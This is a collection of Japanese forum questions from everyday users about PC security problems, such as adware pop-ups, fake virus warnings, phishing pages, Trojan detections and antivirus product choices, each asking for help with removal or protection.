ウェブが毎日何時間かおきに切断されます。ネットがというより、ウェブ閲覧、メール意送受信のみがネットに繋ぐことが出来なくなります。ウェブはChrome、Internet Explorerとも見られなくなります。 再起動すれば正常に戻りますが、また何時間かしたら・・・ 再起動・・・ の繰返しです。 通信を必要とする電話アプリ（050plus)、ゲームアプリは切断されません。（ダウンロード中にウェブが見られなくなり、メール送受信が出来なくなってもダウンロードは終わらず継続されます） そこで調べたのですが、 PCセキュリティーの「Windows ファイアウォール」を無効にして、セキュリティソフトのファイアウォールを有効にすると改善される場合があるとのこと。 PCセキュリティーの「Windows ファイアウォール」を無効にしても大丈夫でしょうか？ セキュリティーソフトはマカフィを使っています。そちらのファイアウォールを有効にしていれば問題ないのでしょうか？ それともWindows ファイアウォール、セキュリティソフト（マカフィ）のファイアウォール両方有効でないと危険でしょうか？ お詳しい方ぜひお教え下さい。
Twitterからメールが届いていたのでうっかりクリックしてしまいました するとはっきり覚えてないですが他のアカウントでログインしてるので…と表示されたと思います 不審に思いメールをよく確認すると宛先がTwitterのアカウントをつくった覚えのないメールアドレス（ほとんど使ったこのないフリーメール）でした このまま放置で大丈夫でしょうか？
クロームを使用しています 以前対処してここ何ヶ月かは全く姿を現さなかったあの邪魔な広告が今日PCを起動してブラウザを開いたらなぜかまた表示されるようになりました （お使いのパソコンの性能が～　や、左横に出てくるRelated Searches等） クロームの拡張機能を見ても不審なアドオンはありませんでしたが、一応念のため全て削除しておきました Yontooのせいかな？と思いYontooもフリーソフトを使ってアンインストールしました それでもまだ消えません。この質問を書いている今も下に広告が表示されていてとても鬱陶しいです 同じ症状になった方や対処法をご存知の方がいましたら回答お願いします
ＰＣを起動させるとまず、操作していないのに勝手にファイルのコピーがはじまります。 ファイル数は少なく、一瞬で終わります。キャンセルする時間くらいはあります。 駆除ツールで検知できないようなマルウェア等のようなものか、 既に駆除済みのマルウェアかトロイなどの残骸が残っていて、勝手に起動するのだと思います。 検出できないマルウェア等が潜んでいるのかどうかを確認できないので困っています。 あきらかに通常の状態ではないことは分かるのですが・・・。 マカフィー、スパイボット、microsoft悪意のあるソフト駆除ツール（うろ覚え）、 Malwarebytes Anti-Malware（スキャンしただけ）、Advanced SystemCare（検出数が数万に及ぶためスキャンしただけ） これらでスキャンしまくりましたが、 なにも検出されないか、あまりに検出しすぎる（誤検出？）かのどちらかで どうすればいいかわかりません。 Malwarebytes Anti-Malwareでは、レジストリキーが検出されたのですがどうすればいいか知識がなかったので不用意に駆除したり削除していいのか分からず、放置しています。 ファイル名は分かりませんが、どうやらＰＢＫフォルダに関係がありそうです。 コピー先フォルダがユーザー名～ＰＢＫ （間は長いため省略されて表示されます。すぐ消えるのでダイアログを広げる時間はありません） ドライブをＰＢＫで検索するとこのフォルダくらいしかヒットしません （隠しフォルダは表示にするを選択済み） ＰＢＫフォルダにはrasphoneというアプリケーションがあります。 知りたいことは主に以下の内容です。 ・特にマルウェアの検出力が高いツール（できれば日本語） ・この現象の正体。また、具体的な改善策 ・おかしなプログラムがはいりこんだ場合の手動での検索方法 ・駆除ツールでレジストリキーが検出された場合、処理してもよいかどうか ・この現象はとりあえず放置していても、ファイアウォール等それなりにセキュリティがしっかりしていれば害のないものなのかどうか。 ・既に駆除済みのウイルス等の残骸であれば、ただ実行されているだけで本体がなければ特に害がないのかなと思いますが（詳しくはしりません）、そのためだけにリカバリーをする必要があるかどうか。 自分でも調べておりますが、ご協力いただければ幸いです。 宜しくお願いいたします。
PC初心者で困っています。昨日からgoogleに関する機能が正常に動かなくなりました。 Yahooを使っての検索、地図の利用等はできるのにgoogleはマップもメールも検索機能も画面が真っ白な状態が続いたり、Suspicious activity is detected.Your account is locked. と表示され、英語でロックされたから手順踏んであなたのアカウントを回復させて！ 的な内容が表示され、進むとクレジットカードとかの情報を打ち込むところに飛びます。これってウィルスですよね？ ちなみにこれはデスクトップでの症状で、ノートパソコンではgoogleは正常に使えています。 対処方法を教えていただきたいのと、できればウィルスソフトに関してもご教授いただけませんかm(__)m恥ずかしながら、自分のPCにどんなウィルスソフトが入っていて、果たしてそのバージョン？は最新なのか、正常に作動しているかもよくわかっていませんm(__)m 自分のPCにどんな不具合があるか、ウィルスソフトはなにが入っているか、入っていないなら何を入れるべきか。こんなようなことが、まとまって書いてあるような都合のいいサイト等ありましたら、リンクを貼っていただきたいです。 仕事でほんの少しワードとエクセルを使うくらいで難しいことは避けていたので、これを機に少しは学ぼうと思います。回答、ご教授お願いいたします。
vmware にて ルートキットや その他 強力な ウイルスに感染させた場合に vmware自体は ウイルスの影響って出るでしょうか？ vmware本体と ＯＳイメージも まるごとバックアップしてるから 影響でても とくに気にはしないんですが 影響の出るウイルスがあるのか 気になりました。 また vmware が感染することで 本体のＯＳに影響が出るのか？ 影響するウイルスが存在してるか？ という点も 気になります。 どうでしょうか？
パソコンがsmart gard protectionというウィルスに感染してしまったようです。駆除方法について調べてみたのですが、信頼できる情報が良くわからず困っています。もし良い駆除方法をご存知でしたらお教えください。
パソコン初心者です。 いろいろと触っているうちにＱＶＯ６という変なサイトが入り皆さんの質問の回答をもとに削除しようといろいろと試みたのですがうまくできません。 英語の文章　http://deletemalware.blogspot.com/2013/04/qvo6-r … ではチンプンカンプンなため日本語でうまく手順できるものがあれば教えていただきたいのですが。 ＯＳは　windows 7です。 よろしくお願い致します。
新しいPCを買い古いPCからファイルを移していたところ、新しいPCでウィルスとして駆除されたファイルが出てきました。 2台とも同じノートンを入れていて、古いPCで該当ファイルを何度スキャンしても問題なしとされます。 2台ともノートンの設定は初期設定のままいじっていません。 2台ともノートンのバージョンも定義ファイルのバージョンも同じものです。 違う駆除ソフトで結果が違うのはわかりますが、同じソフトで結果が変わるのは何故なのでしょうか？
ノートンが再インストールしてくださいと要求してきた しばらくクイックスキャンなどができなく修復ツールをクリックしても反応なしだったが ノートンが再インストールしてくださいと要求してきました 再インストール後 アップデート３つのうち下の２つはアップデートできませんでした 信頼レベルは６８です 現在　親　精神病院　中国労働金庫ともめてます
最近と言っても昨日からなのですがアバストから脅威をブロックしましたという通知が１５分おきくらいに来るのですがウイルスに犯されているのでしょうか？ ブートタイムスキャンをしたりしたのですがまったく解決されません 解決方法のわかる方どうかよろしくお願いします ↓参考になれば... ブロックされた感染 URL:　//cybermindtool.info/get/　←間違って踏むといけないのでhttp:消しましたが 感染:URL:Mal 最近インストールしたものといえばLINEくらいです
買い換えたパソコンは windows7 。 差し当たり、マイクロソフト・セキュリティ・エッセンシャルを使用しています。 一方で、以前のパソコンで使っていたものが［ウィルスセキュリティ（ソースネクスト社）］ですが、更新して使うには新たに料金がかかります。 無料のマイクロソフト・セキュリティ・エッセンシャルをそのまま使い続けていいものか、有料のウィルスセキュリティを更新したほうがいいのかアドバイスをお願いします。
フリーどうしの組み合わせとしてどのファイヤーオールとどのウィルスソフトの相性が一番でしょうか？ カスペルスキー並みの防護力が目標なのでどの組み合わせが良いか教えてもらえると助かります。
マカフィーでウィルスを完全検査したところ、潜在的な危険なプログラムが３つも見つかりました （一つはトロイの木馬では無いと出たのですが、あと２つがArtimis!と出て、どういうウィルスか不明のようです） 隔離しようとしたのですが隔離できなかったのでマカフィーのサイトに書かれているとおりに セーフモードで起動し→再検査（完全スキャン） をしたのですが、何故か隔離できない危険なプログラムが見つからず結果ゼロ 最初に隔離できなかったのに何故なんでしょう？ 手動など他の方法で隔離するしかないのでしょうか？
こんばんは。ウィルスについて教えていただきたいのですが １．ウィルス、アドウェア、スパイウェア、マルウェアというのはどう区別するのでしょうか？ 　　ちょっと検索しましたら区別があいまいになってきているので総称してマルウェアと呼ぶ 　　というような説明でしたがそれでいいのでしょうか？ ２．セキュリティ対策の場合、ウィルス対策ソフト、スパイウェア対策ソフト、ファイアウォール 　　の３つを入れるようにと以前教えていただいたのですが私の場合、avast! Spybot 　　 ALYac のファイアウォール機能だけを使ってるいるのですがこの程度でよろしいですか 　　？ALYac は総合対策ソフトなんですがなんか弱弱しくて（＾＾； 　　いろいろ教えてください！よろしくお願いします。
購入したいものがあり、検索から探していました所、トロイの木馬が隔離されました。とESETセキュリティがポップ通知してくれました。 幼児用の商品サイトを開けて、ウイルスが入るのか！ とびっくりして、SHOPサイトが自分からこんなことをするとは信じがたくて このサイトにトロイの木馬のウイルスが付いてますので修理して下さい。っと連絡してあげたくて もう一度、サイトにアクセスして、連絡先か、問合せ先になるのはないかと見回したり 問合せの所をクリックしたり、したのですが 会社名も、メールも、管理者名もヒントになるものは、発見できず 見回している間、何度もESETセキュリティから隔離しました。と赤いポップウインドが立ち上がり しまいに怖くなって、 サイトを閉めました。 でも、閉めたあとも赤いポップウィンドウが立ち上がり続けたので、ＰＣを再起動としました。 セキュリティの赤いポップは停まりましたが、 ＳＨＯＰサイトさんに連絡してあげる方法はないのかと、 サイトのＵＲＬをどこかに報告する場所とかないのかと、 探しましたが、ないみたいです。 このＳＨＯＰサイトが危ないって報告する所はないんでしょうか？
最近FirefoxやGoogleChromeなどのブラウザを使っているときに画面をクリックすると、新しいウィンドウが表示されて、変な広告が出てきてしまいます。（スクリーンショットを添付しておきました。） ウィルス対策ソフトで検査したのですが、どうやら引っ掛からなかったようで、今も症状は治っていません。 非常にうっとおしいので何とかしたいです。 どなたか助けてください、よろしくお願いします。
avast!　（ウイルス対策ソフト）と、firefox（ブラウザ）の組み合わせで、google検索すると、検索結果が出た直後に、firefoxが応答なしになります。 そのまま数秒すると、google検索結果リンクの横に、avast!アドオンウェブスキャナー結果（緑色や灰色等のチェックマーク）が表示され、firefoxの応答なしは解消されます。 firefoxと、avastウェブスキャナーの組み合わせでは、こんな状況が生まれるのでしょうか。 被験者のかた、こうした点にお詳しいかた、ご回答ください。
★先日surfaceRTを購入しましたけど・・・surfaceRTセキュリティ対策？は不要なのでしょうか？ 何もしなくて良いのでしょうか？
ウィルスバスターをアップデートするとギャンブル系（競馬も）表示されなくなりました。「家族を守る」が有効になっているからでしょう。無効にするにはどう設定するとよろしいでしょうか。
ノートンでＵＳＢメモリをスキャンしても反応ない時はどうすればいいのでしょう リームーバブルディスク→右クリック→今すぐスキャン 待ち時間のアイコンがくるくる回っているだけです たまにスキャンが出来て脅威無しと出ます ウイルスでしょうか 他のやり方でＵＳＢメモリをスキャンできる方法はありませんか
ウィルスソフトを購入しようかとネット検索した所、かなり種類がありました どれが良いか聞いて回ればフリーソフトで十分と言われる方も居ればウィルスバスターじゃないと意味がないといわれる方まで様々でした 実際、フリーソフトでは意味がないのでしょうか？ ウィルスバスターでなくては意味がないのでしょうか？ フリーソフトでは意味がなくウィルスバスターじゃなくても構わないなら実際どのセキリティソフトにすればよいのでしょうか？ やはり値段が高いソフトには意味があるのでしょうか？ 一度ウィルスでPCのデータをパーにしたので次は後悔したくありません 詳しい方がいましたら教えて下さい
Ｗｉｎ７、Ｗｉｎ８パソコン2台を保有しておりますが、現在まで5年あまり カスペルスキーのマルチプラットホームセキュリティを継続使用しております。 上級者向きと宣伝されてますが、私の様な比較的ヘビーでもなく複雑な作業をするでもないのですが、あまりパソコン上意識せず作業でき以前使用してたノートンより、重くない感じで良かったのですが、 先ずお聞きしたいのですが、2014版同製品は6400円前後（量販店）ですが、 前回はケチるわけではないですが、2013年版は4000円代で買いました。 2013年版と機能的差異はそんな無いと思いますが高いですよね？ あまり高ければ他社で検討したいのですが、 カスペルスキー同様1年3台（ＯＳ3種類対応）版で4000円代ぐらいで お勧めのソフトはないでしょうか？
セキュリティソフトをウイルスバスタークラウド2011からavast internet securityに変更したのですが、それまで正常に起動していたアプリケーションがダブルクリックしても何の反応もしなくなりました。 avastの設定から常駐保護→ファイルシステムシールド→スキャンからの除外に*.exeを追加したり、アプリケーションを置いてあるディレクトリを追加したのですが、改善しません。 他に設定をする項目があるのでしょうか？
android無料セキュリティアプリで簡単に設定、扱えるのを教えてください できれば説明、取り扱いがしてあるＵＲＬがあれば教えてください。 スマホを買って、ＳＩＭカードデーターを使おうと思っています。
こんにちは。 ウイルスバスターの更新について質問があります。 現在、私はウイルスバスターを使っています。 一つは私のノートパソコン　windows7 ultimate 二つ目は親(実家)のノートパソコン　windows7 home 三つ目は親(専用)のパソコン　windows7 home ○本題です○ ウイルスバスターの更新はどのように行われるのでしょうか？？ 一台のウイルスバスターを更新すれば、ほかの二つは自動的に更新されるのでしょうか？？ ※親がコンピューターに疎くて、パソコンのことがいまいちわからない状態です。 　 　　それでも料理のレシピの印刷やインターネットを使えることはできます。 親がウイルスバスターの更新等ができるとは思えませんので、やってあげたいのですが… 実家に帰ってやってあげるのも、ちょっと時間がかかります…。。。。 ＞＞ウイルスバスターの更新はどのように行われるのでしょうか？？ もし、一台ごとにしか更新できないのであれば、ノートンに変えようと思います。 確かノートンはアカウントで更新ができるはずなので。 ＞＞ノートンはアカウントで更新できますよね？？
２０１３カスペルスキーの　保護機能がエラーを吹いて 再インストールを求められましたが 私はディスク版を購入してインストールしましたが ディスクがどこに行ったか　紛失してしまいました。 アクティベートコード自体は入力済みで　再インストールだけできればよいのですが 何か手はないでしょうか。
総合対策ソフトを選ぶにあたって、防御性能重視の場合どういった点に着眼すればよろしいでしょうか。 詳しい方お願いします。 CPU：Core i7 2.2GHz Memory：8GB HDD：1TB OS：Windows 7 Home Premium 64bit
Norton Internet Securityを使っています。今日Adobe のアップデートをしていったらMcAfee Security Scan Plusが勝手に入っていました。いつもはそういうほかのセキュリティソフトやGoogle Chromeが入らないように注意しているのですが、今回は油断していたのか入ってしまったようです。 セキュリティソフトの重複がまずいのは常識ですが、それはファイヤーウォールがセキュリティソフト同士でコンフリクトするからだと思っていて、実はウィルススキャンだけでファイヤーウォール機能がなければ問題ないのかとも思いました。 実際のところどうなんでしょうか？ やっぱりNortonなど何かセキュリティ製品が入っていれば他のセキュリティソフト関連は全く入れないほうがいいというのは不変でしょうか？
今のところは2013でもちゃんと更新できてるんですが、２０１３が更新できなくなって2014年版、2015年版などにアップグレードが必要となるのは何年先でしょうか？ また、2012年版やそれ以前の版は何年間更新がサポートされてたのか、教えてください。
アマゾンのカスペルスキー２０１３年版は3年プライベートでも5000円ちょっとの値段だったのに2014年のプライベートは9000円近く、ファミリー版は1万円超えてます。少し前見たら2013年版も値段が大幅に上がってました。 これは発売直後だからで、しばらくしたらまた元の値段に戻るんでしょうか？2013年版も最初は値段高かったんでしょうか？どういうことなのか教えてください。
ウイルスバスタークラウドを見たら、な！な！な！なんと！脅威が３６件も！！！！ これって異常ですよね・・・・・・・？ いつのまにかこんなに増えてました・・・・・ バスターでクイックスキャンしてｃｏｏｋｉｅを削除したんですけど、バスターによってブロックされてるウイルスがバスターを破って侵入することはあるんでしょうか・・・・？ もし侵入されたらどうなりますか・・・？ スキャンすると毎回トロイの木馬が検出されます　 Ｗｉｎｄｏｗｓ８
インターネットに接続するとき、（コードレスでない限り）プロバイダから借りている機械とPCをコードをでつないで接続しますが、例えばプロバイダから借りる機械→PC：A→PC：Bというようにつなぐことはできますか？（→はコードかなにかだと思ってください） このようにつなぐとPC：Aを介しているのでAのセキュリティがしっかりしていればBにウイルスなどが入ってくる可能性が低くなると聞きました。（極端ですが、PC：Aウイルスバスター入り、PC：Bウイルスバスターを入れていないというふうに考えてください。） これは本当ですか？
アンチスパイウエアソフトでレイジストリの (x86)HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN#20131121 がTrojan.Agent/Genに感染していると出て削除しました。 （avast！では削除前にシステム検索をかけても無検出でした） (1)　このレイジストリはどういうものででしょうか？ (2)　削除しましたがシステムに悪影響を及ぼすものではないのでしょうか？ (1)(2)について明快な回答をよろしくお願い致します。 OSはWin7のx64です。
ノートンアンチウイルスを使用しています。最新バージョンで定義ファイルも最新です。 ただセキュリティソフトでも駆除はおろか、発見すらできないものがあると聞き、とても心配しています。以前完全スキャンをしたら、低レベルですが3つほど脅威が出てきました。 以前間違えて、英語のフリーソフトをダウンロードしたことがあります。心配しすぎでしょうか？
6年前の古いノートpcをSSDに換装したいと思っています。最近pcのHDDの容量が小さいファイルをDLしただけで大きく容量が減ったりメモ帳を削除しただけで1GB程度容量が戻ったりとHDDの寿命かなと思っています。そこで移行するためにクローンを作成したいと考えるにあたっては不安な点があるので対処方を教えてもらえると助かります。 •昔からインストール作業を頻繁に行っておりIEは複数のわけの分からないサイトに繋がったり変なアドオンでいっぱい(現在fire fox使用) •動画サイトなどに接続するとたまにですがマカフィーが不正な接続を確認する •今はないですが一時期はDVDドライブが勝手に開く(トロイというウイルス?) など不信な点がいくつもあり表現しにくいですが中がもういろんな意味でボロボロなんじゃないかなと。。 ウイルスやIEの無駄なアドオン等を削除したりと綺麗な状態で移行したいのですが何か良い方法はないでしょうか？必要ならスペックも載せます。 長文駄文ですがよろしくお願いします。
ニコ動、Dailymotin,FC2等で単に動画を視聴するだけでも ウィルスなどに感染する場合はありますか？ もちろん、まともな映画やドラマしか見ませんが。 カスペルスキーを導入したり、各種アップデートなどセキュリティ対策はやっています。
先日ウイルスバスターを新しい３年ものに替えたばかりなのに、，ひんぱんに おたくのウイルスバスターは最新のバージョンではありません。という表示が出ます。 バージョンアップするようにと云ってきますが、こんなばあい皆さんはどうしておられますか。 よろしくご回答お願いします。初心者同然のものです。
ＯＫＷＥＢや教えてＧＯＯの方に自分のサイト名（すぐ削除される）や 私が巻き込まれた犯罪の事（現在進行形） 書き込んでくる非公開の人の事を書いて投稿しようとすると処理が重くなります サイト名を書いた投稿では投稿するのに３分くらいかかり アイチューンズが同じところを再生し続けました パソコンは買って１年たっていません ノートンを入れていますがパソコンが見られているのでしょうか？ 犯罪者は複数います
対策ソフトで完全スキャンをしばしば行うとHDをいためるという話を聞きました。 それではどの程度の頻度で行えばよいのでしょうか？
最近、新しいパソコンを買いました。色々とセッティングしてようやく使えるようになったのはいいのですが、ワードなどで作業していると、突然得体の知れない広告が入ります。 「あなたのパソコンはまもなくクラッシュします！」とか、「非常に危険な状態です！」とか、危機を煽り、「今すぐココをクリック！」と言って、ソフトを買わそうとします。 そればかりか、変なアニメの画面になったり、以前は半裸の女性の画面が出たこともありました。 ウイルスをスキャンしても、感染しているわけではないようです。 このような変な広告（Ads by Viewpasswordとか書いています）が送られてこないようにするにはどうすればよいのですか？　パソコンに詳しい方、教えてください。
でシステムの完全スキャンした 内容どこで見るんですか？
会社のパソコンがこの前トロイの木馬に感染したらしく、パソコンに詳しい人に直して頂いたりと試みてもらったのですが結局は初期設定したほうが早いだろうとのことで、先日初期設定をしました。 それで、圧縮解凍ファイル（無料）を毎回ダウンロードしているサイトでダウンロードした際、どうやら上ではなく下の英語の方のページでダウンロードしたいみたいで、また怪しい画面になり、ダウンロードのファイル名も「Open it」という、いかにも怪しいファイル名になっていました。慌ててそのダウンロードしたものを削除して、今スタート画面からすべてのプラグラムを見てみても怪しいものはなさそうに思います。 会社で全員使っている無料のセキュリティソフトAviraでもウイルスは検出されませんでした。 でも3回のうち１回は電源入れた時に「あなたのパソコンはクラッシュ寸前です！」という画面が出たり（インターネット画面が開いてこの表示が出ている時もあり）、今日の運勢という広告が右下に出てきたりします。（これは消すマークが出ていません） それが出たらいつも電源を入れ直すのですが、それでは意味ないですよね。 もちろん自分が悪いのはわかっているのですが、会社の人にまた聞くのも申し訳ないし、初期設定をやるとなるとまた上司にいろいろと迷惑をかけてしまいます。。 何かいい策はないでしょうか？ ちなみに電源入れる時にそういう表示が出るのがほとんどで、今のところほかに何も症状はありません。 今朝出た「クラッシュ寸前」と「今日の運勢」がインターネット画面で一緒に出たときはURLがおそらくですが、 static.australianbrewing company.com divr.readserer です。 あと、毎回更新プログラムが出て、シャットダウンの際に更新されていますが、毎回失敗しています。 Microsoft Visual C++ 2008 Service Pack 1 再頒布可能パッケージのセキュリティ更新プログラム (KB2538243) エラーの詳細: コード 643 Microsoft XML コア サービス 4.0 Service Pack 3 for x64-based Systems 用セキュリティ更新プログラム (KB2758694) エラーの詳細: コード 643 ちなみにNECのVALUESTARE windows7です。 無知な私に、どうぞよろしくお願いします。
androidタブレットにおすすめのセキュリティを教えてください。 現在WiFi接続でのみタブレットを使っています。 無料でお勧めのセキュリティはありますか？ 先ほどざっと検索して「Lookout」というアプリを入れました。 このアプリの性能はどうでしょうか？ もっとお勧めのものがあれば教えていただけるとありがたいです。 よろしくお願いします。
ＡＶの会員勧誘の不正ポップアップ画面が出現し困っています。自業自得ですが(汗) 実は、以下の方法で削除には成功しているのですが、再起動するとまた出てきてしまいます。 この削除の状態を保持するにはどうすれば良いのか教えて下さい。 OSはWindows８．但し７からのバージョンアップです。 コントロールパネル→管理ツール→タスクスケジューラ→アクティブなタスクから「mshta」関連のファイルを削除しました。 先週末からですが、今はパソコンを立ち上げる度に上記の削除を行ってから作業等をしています。 面倒くさくて困ります。ぜひよろしくお願いします。
お願いします。 ただいま私のＰＣには有料のセキュリティソフトが入っていますが、毎年自動的に半ば強引に継続する仕組みで、そんなに安くはなく、しかも友達いわく、「もったいない。無料ので十分」ということなのですが、 ＷＩＮＺＩＰなる、無料の「PC の高速化、システムのクリーニング、保護、最適化を目的として作られた使いやすい PC ツールの総合セット、WinZip® システム ユーティリティ スイート」について、実際にダウンロードして使っていらっしゃる方のご意見を伺いたいです。 これは信頼できるものですか？ 今のソフトが入っているせいで、大変重くなっていますし、なによりお金が強引にかかるのが嫌なので、アンインストールしたいです。 その後、できたらこれに変えたいと思いますが。。。。
プロバイダをSo-netでインターネットをしていて、So-netのウェブメールを見ていたら ソースネクストのウィルスセキュリティでウィルスが発見され、 [問題の症状] Virus (008bb341) に感染しています。 [ステータス] 隔離できません。 になってしまいました。 この場合どのようにすれば安全なのですか？ 教えてくださいお願いします！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
まずネット環境はマンション接続のeo光ネットを利用して パソコンは3台無線LANで使用しています。 そのうちの１台が表題のウイルスに感染してしまった場合、 セキュリティソフトで万一削除したとあっても 念のためにすることはありますでしょうか？ 全てのIDやパスワードを今から変更する前にしておくことがありましたら 教えて頂けると幸いです。パソコン素人なので自分で考えられる範囲では とりあえず今のPCをリカバリして、ネットバンキング等重要なものの 利用はそれだけの為に使用する専用PCを購入して、現PCでは利用しないようにする。 ただ新しいPCでも他のPCと同様無線LANを使用してネットにつなげば これもあまり意味がないのでしょうか？　既存PCからウイルスに感染してしまう可能性ありますか？ また新しいPCを利用したとしてそこでセキュリティソフトを使用する以外に パススティーラーの具体的な対策等はありますでしょうか？自分で調べたところでは ロボフォームを普段使用しているのですが初回登録時はやはりキー入力してしまってますので その際にロガー対策としてKeyScramblerとゆうソフトを利用する等ぐらいしか わかりませんでした。そのほかに万全な対策法がありましたら教えて頂けると幸いです。 すみません。初めての事で少し動揺しているので乱文が目立ち 読みにくい部分等多々あるかと思いますがお詳しい方いましたら 是非お力をお貸しいただければと思います。宜しくお願いします。
実家のパソコンの様子がおかしいの 聞いたので行って見てみると、 Reg clean proを入れてしまっていました。 Reg clean pro自体の アンインストールと、思い当たる 日にちの怪しいソフトを全て コントロールパネルからアンインストールして、 広告はなくなりました。 ですが、ATF CLEAN等、なんらかの ソフトをダウンロードしようと検索すると 大体のサイト内にreg clean proの 文字があったりと、非常に怪しいサイトに しか辿り着けず何もダウンロードできません。 コントロールパネルにはもう、覚えの あるものしかないかと思うのですが 本当に全て消えているのでしょうか。 ちなみに、yontooやcoolは探しましたが ありませんでした。Tuto4削除しました。 どなたか教えてください。
Wi2　の使用はセキュリティ上は安全でしょうか？ もちろんセキュリティソフトは使っている上での質問です
大丈夫なソフトなんですか? パソコンの機能が低下しています。今すぐダウンロードして下さいとトップページのバナーの所に出ます。クリックするとRegClean Proをダウンロードボタンが出ます。ページには マカフィーやマイクロソフトも推薦しているようなロゴがでていますが大丈夫なんでしょうか。 最近ノートPCの作動が少し遅くはなっています。現在、セキュリティーソフトはトレンドマイクロのウイルスバスターを使用しています。このRegClean Proソフトダウンロードしても大丈夫なのでしょうかよろしくお願いします。 PCはacerのウインドウズ7ノートです。　もう一台使っている東芝ダイナブックのノートPCこれもウインドウズ7です。の方はあまり見た記憶がありません。こっちの方がメモリが大きいからでしょうか?よろしくお願いします。
DDoS Attackってfirewallで防げないんですよね。。。どうやって防ぐのでしょうか。ご存知の方教えてください。
セキュリティの一環としてフリーのセキュリティソフトMalware bytesを入れていたのですが、「試用期間あと５日で終了」と出ました。どうやら「リアルタイム保護のためにプロ版（有料）を買え」と言っているようですが、有料版のセキュリティソフトは他社のものを既に購入しパソコンの中に入っており、リアルタイム保護もそちらで出来ています。 私がMalware bytesで欲しかったのはスキャンしてマルウェアを発見したら隔離、自分で削除できるというこの部分だけで、スキャンしてその機能さえ使えれば問題ありません。 しかしフリー版の試用期間が終了したらその機能も使えなくなるのでしょうか？更に、自分のパソコンからアンインストールしなければならないのでしょうか。 三択の画面が出て「試用期間を終了する」と選択したので、たぶんリアルタイム保護は出来なくなっています。（プロ版ならこんなことできるよのリストがリアルタイム保護のタブに出ています）私はこの後どうすればいいのでしょう？特に有料版は欲しくないし、スキャンと隔離・削除の機能も使えなくなるのならアンインストールするしかないのですが、もし期間は関係なくそれだけでも出来るならずっと使いたいと思っているのですが。どなたか教えてください。よろしくお願いします。
AcronisTrueImageの試用版で、内蔵HDDのフォルダと外付けHDDのフォルダの同期をトライしていますが、片方にフォルダを追加・削除する度に、「怪しいファイルをブロックしました」との警告が出ます。 オブジェクト：F:\Mydoc\.sync\confirm(5) 感染　　　　　Win342:Evo-gen[Susp] このファイルをスキャン対象から外す　をクリックしても、状態は変わりません。 解決策をご存知のかた、ご教授願います
つい最近ゆうちょダイレクトの申込をしたのですが、ウィルスアプリのダウンロードをすすめる記載があったのですが、どのアプリをダウンロードすればいいのか分かりません。 現在ウィルスバスターfor auだけをダウンロードしています。 それとゆうちょダイレクトの申込をした後に、メールアドレス登録完了？のメールが届くと思うのですが、一切届きません… さっきダイレクトからゆうちょ宛に振り込みをしたのですが、確認メールが届きません(>_<) ドメイン設定もして、アドレスに間違いがないかも確認しました。 ◎ゆうちょダイレクトに必要なウィルスアプリのおすすめ ◎ゆうちょダイレクトからのメールが届かない原因 この二点でご存知な方、回答宜しくお願い致しますm(__)m 現在スマホの動作が遅かったり途中でいきなり再起動したり不安な事があります。 宜しくお願い致します！
操作の途中で、添付の表示が点滅して、表示されました。 広告として、出ているのではと、思います。 しかし、なんだか怪しいと思い、クリックしていません。 代わりにキャプチャーしました。 正体が分かれば教えて下さい。
カスペルスキーを起動していると、メールチェックができません。 過去の記事をみて、アンチスパムを無効化してもメール受信することができませんでした。 ファイヤーウォールが原因かと思いこちらも無効化して見ましたが、それでもメール受信はできませんでした。 PC環境は OS：Windows７ Pro アンチウイルスソフト：カスペルスキー 2013 マルチプラットフォーム セキュリティ メーラー：Thunderbird 24.1.0 アンチウイルスソフトをきってメールチェックをするのは本末転倒なので対処法を 知っている方がいましたら是非、ご回答をお願いします。
パソコン起動時に 指定されたデバイス、パス、またはファイルにアクセスできません。 アクセス許可がない可能性があります。 と出てきます。 対象ファイルは以下のようなものです。 C:\Users\XXXX\AppData\Roaming\Microsoft\Crypto\DES64v7\msieckc.exe SOURCENEXTのスーパーセキュリティZEROのウィルスチェックで必ず感染しているファイルとしてチェックされ、何度か駆除したのですが、すぐに復活するようでPC起動時に必ずこの警告画面が出ます。 パソコンのOSはWindows7です。 何とか元から消したいのですが、どうすればいいでしょうか。
パソコン初心者です。　アダルトサイトの画面を行ってしまったところ、勧誘画面が現れその画面の「X」をクリックすると一時消えますが何度も現れます。　　初心者なので具体的に解りやすく解決方法（消し方）を教えてください。 　入会等の記入は一切していません。 使用パソコンは東芝dynabookのwindow7です。
今月で期限きれになるのでNortonからウイルスバスターに切り替えようと思っています。 そこで、NortonIDセーフだけを残しその後ウイルスバスターをインストールしてそのまま使う。。ということは可能でしょうか？ もしくは一度アンインストールして　IDセーフのみを入れるのは可能でしょうか？ ウイルスバスターにもID管理ソフトはあるようですがまた一から打ち直すのは面倒です 互換性があれば楽なんですが、、、 フリーソフトも考えたんですが　IDManager使えませんでしたし 入れ方の問題かもしれませんが他のも動かず。。。
何もしてないのにパソコンの検査をしてくださいってインターネットが出てくるんだけど出ないようにするにはどうすればいいですか？
ノートンインターネットセキュリティ2013のパッケージ版を購入し使用していましたが 2014年度版が出たのでそちらに更新をいたしました。 この時は自動でしてくれましたがOSをクリーンインストールした時に 2013-2014にするのではなくいきなり2014をインストールする方法はないでしょうか? 体験版をインストールする方法以外でわかる人は教えて頂けると嬉しいです。 (2013は体験版でインストールすると最新のパッチは適用されずCDからしか最新にならなかったので)
お世話になります。　いこまです。 愛機DELL OptiPlex 990/Corei7-3.4G/16G/500G/XP Win7-64bitに ESET SMART SECURITY6を入れました。 3年で4000円ぐらいかな。安かったから。 しかし、信頼性に疑問を感じていた、いこまは昨夜、プロバイダーの 社長じきじきにTeamVieser8で遠隔しチェックしてもらいました。 すると、社長は英語が読めるのですが、日本語の訳がおかしい ちょっと変なセキュリティだと言います。 確かに変です。軽すぎるし。 以前にマカフィーで、ウイルスに感染したので 思いっきりクレームつけて返金させました。 一体、何を入れれば安心なんでしょうか？ どうしても守らなければならないファイルが沢山あるんです。 仕事上、消えては困るし、侵入されても困ります。 一体、どうしたらいいのでしょうか？ アドバイスよろしくおねがいいたします。 　　　　　　　　　　　　　　　　　　　　　　　　　いこま
